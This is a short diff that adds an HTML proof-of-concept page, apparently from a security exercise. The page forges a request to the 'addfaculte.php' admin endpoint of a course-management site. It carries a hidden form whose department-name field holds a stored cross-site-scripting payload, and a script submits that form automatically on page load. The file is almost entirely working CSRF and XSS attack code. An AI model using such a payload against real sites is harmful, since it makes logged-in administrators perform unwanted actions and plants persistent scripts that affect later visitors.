@@ -1,0 +1,26 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/admin/addfaculte.php?a=3' method='post'>
+ <tbody><tr>
+ 		<th width="220">&nbsp;</th>
+ 		<td colspan="2"><b>Εισαγωγή Στοιχείων Σχολής / Τμήματος</b></td>
+ 		<tr>
+ 		<th class='left'>Κωδικός Σχολής / Τμήματος:</th>
+ 		<td><input class='FormData_InputText' type='text' name='codefaculte' value='ADDFAC' /></td><td><i>(με λατινικούς χαρακτήρες μόνο, π.χ. MATH)</i></td>
+ 		</tr>
+ 		<tr>
+ 		<th class='left'>Σχολή / Τμήμα:</th>
+ 		<td><input class='FormData_InputText' type='text' name='faculte' value="<script>alert('addfaculte')</script>" /></td><td><i>(π.χ. Μαθηματικό)</i></td>
+ 		</tr>
+ 		<tr>
+ 		<th>&nbsp;</th>
+    <td><input type='hidden' name='c' value='4' />
+ 		<td><input class='FormData_InputText' type='text' name='edit' value='submit'></td>
+ 		</tr>
+ 		</tbody>
+ 		</table>
+
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
